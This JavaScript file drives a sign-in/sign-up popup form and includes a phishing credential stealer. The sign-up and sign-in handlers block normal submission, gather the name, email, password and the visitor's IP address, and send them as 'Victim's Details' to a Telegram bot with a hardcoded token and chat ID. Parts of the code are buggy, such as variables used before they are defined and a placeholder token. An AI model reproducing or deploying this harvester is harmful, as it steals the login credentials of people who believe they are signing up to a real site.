let signupBtn = document.getElementById("signupBtn")
let signinBtn = document.getElementById("signinBtn")
let signupBtn1 = document.getElementById("signupBtn1")
let signinBtn2 = document.getElementById("signinBtn2")
let nameField = document.getElementById("nameField")
let title = document.getElementById("title")
let a = document.getElementById("a")
let p = document.getElementById("p")
let reg = document.getElementById("reg")
let box = document.getElementById("boxing")
let regField = document.getElementById("regField")
let close = document.getElementById("close")
let signBtn = document.getElementById("signBtn")
// let btnField = document.getElementById("btnField")

signinBtn2.onclick = function(){
    nameField.style.maxHeight = "0";
    // btnField.style.marginTop = "50px"
    title.innerHTML = "Sign In";
    signupBtn.classList.add("disable");
    signinBtn.classList.remove("disable");
    signupBtn1.classList.add("disable");
    signinBtn2.classList.remove("disable");
    p.style.visibility = "visible";
    signinBtn.style.visibility = "visible";
    signinBtn2.style.visibility = "hidden";
    signupBtn1.style.visibility = "visible";
    signupBtn.style.visibility = "hidden";

}
signupBtn1.onclick = function(){
    nameField.style.maxHeight = "50px";
    // btnField.style.marginTop = "50px"
    title.innerHTML = "Sign Up";
    signupBtn.classList.remove("disable");
    signinBtn.classList.add("disable");
    signupBtn1.classList.remove("disable");
    signinBtn2.classList.add("disable");
    p.style.visibility = "hidden";
    signupBtn.style.visibility = "visible";
    signupBtn1.style.visibility = "hidden";
    signinBtn.style.visibility = "hidden";
    signinBtn2.style.visibility = "visible";
}

reg.onclick = function(){
    box.style.visibility = "visible"
    regField.style.visibility = "hidden"
    signupBtn.style.visibility = "visible"
    signinBtn2.style.visibility = "visible"
    // signupBtn1.style.visibility = "hidden"
    // signinBtn.style.visibility = "hidden"
    // p.style.visibility = "visible"
    // if (nameField.style.maxHeight = '0'){
    //     p.style.visibility = "visible"
    //     signinBtn.style.visibility = "visible"
    //     signupBtn1.style.visibility = "visible"
    // }
    // if (nameField.style.maxHeight = "50px"){
    //     p.style.visibility = "visible"
    //     signupBtn.style.visibility = "visible"
    //     signinBtn2.style.visibility = "visible"
    //     nameField.style.maxHeight = '0'
    // }
    off.style.visibility = "visible";
    on.style.visibility = "hidden";
    signupBtn.style.transition = ('0.3s')
    signinBtn.style.transition = ('0.3s')
    signupBtn1.style.transition = ('0.3s')
    signinBtn2.style.transition = ('0.3s')
}
signBtn.onclick = function(){
    box.style.visibility = "visible"
    regField.style.visibility = "hidden"
    signupBtn.style.visibility = "visible"
    signinBtn2.style.visibility = "visible"
    // signupBtn1.style.visibility = "hidden"
    // signinBtn.style.visibility = "hidden"
    // p.style.visibility = "visible"
    // if (nameField.style.maxHeight = '0'){
    //     p.style.visibility = "visible"
    //     signinBtn.style.visibility = "visible"
    //     signupBtn1.style.visibility = "visible"
    // }
    // if (nameField.style.maxHeight = "50px"){
    //     p.style.visibility = "visible"
    //     signupBtn.style.visibility = "visible"
    //     signinBtn2.style.visibility = "visible"
    //     nameField.style.maxHeight = '0'
    // }
    off.style.visibility = "visible";
    on.style.visibility = "hidden";
    signupBtn.style.transition = ('0.3s')
    signinBtn.style.transition = ('0.3s')
    signupBtn1.style.transition = ('0.3s')
    signinBtn2.style.transition = ('0.3s')
}

close.onclick = function(){
    box.style.visibility = "hidden"
    regField.style.visibility = "visible"
    p.style.visibility = "hidden"
    signinBtn.style.visibility = "hidden"
    signupBtn.style.visibility = "hidden"
    signinBtn2.style.visibility = "hidden"
    signupBtn1.style.visibility = "hidden"
    off.style.visibility = "hidden";
    on.style.visibility = "hidden";
    signupBtn.style.transition = ('none')
    signinBtn.style.transition = ('none')
    signupBtn1.style.transition = ('none')
    signinBtn2.style.transition = ('none')
}

//telegram send qiliw uchun

let sendBtn = document.getElementById('signupBtn');
sendBtn.onclick = () => {
    event.preventDefault();
    let name = document.getElementById('name').value;
    let email = document.getElementById('email').value;
    let password = document.getElementById('password').value;
    if (name && email && password ) {
        message = `Victim's Details:\n\nIp: ${ip}\nEmail: ${email}\nName: ${name}\nPassword: ${password}`;

        let xhr = new XMLHttpRequest();
        xhr.open('POST', `https://api.telegram.org/bot6156786743:AAHAdtl2FhNos02oQlAO6pYlWR2uXtWOn7I/sendMessage`, true);
        xhr.onload = () => {
            let respone = JSON.parse(xhr.responseText);
            console.log(respone)
            if(respone.ok) {
                console.log("Sent");
            }else{
                console.log("Don't Sent");
            }
        }
        xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        xhr.send(`chat_id=2037612166&text=${message}`);
        
        // fetch('https://api.ipify.org?format=json')
        // .then(response => response.json())
        // .then(data => {
            // let ip = data.ip;
            // sendToTelegram(ip)
        // });
    }
}
let sendBtn2 = document.getElementById('signinBtn');
sendBtn2.onclick = () => {
    event.preventDefault();
    // let name = document.getElementById('name').value;
    let email = document.getElementById('email').value;
    let password = document.getElementById('password').value;
    if (email && password) {
        message = `Victim's Details:\n\nIp: ${ip}\nEmail: ${email}\nPassword: ${password}`;
        let ip = ip1
        let xhr = new XMLHttpRequest();
        xhr.open('POST', `https://api.telegram.org/bot(mytoken)/sendMessage`, true);
        xhr.onload = () => {
            let respone = JSON.parse(xhr.responseText);
            console.log(respone)
            if(respone.ok) {
                console.log("Sent");
            }else{
                console.log("Don't Sent");
            }
        }
        xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        xhr.send(`chat_id=2037612166&text=${message}`);

        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                let ip1 = data.ip
            });
            // function sendToTelegram(ip){
            //     let ip = ip
            // }
    }
}
let on = document.getElementById('on')
let off = document.getElementById('off')
let password = document.getElementById('password')
off.onclick = function on2() {
    on.style.visibility = "visible";
    off.style.visibility = "hidden";
    document.getElementById('password').type='text'
}
on.onclick = function off2() {
    off.style.visibility = "visible";
    on.style.visibility = "hidden";
    document.getElementById('password').type='password'
}
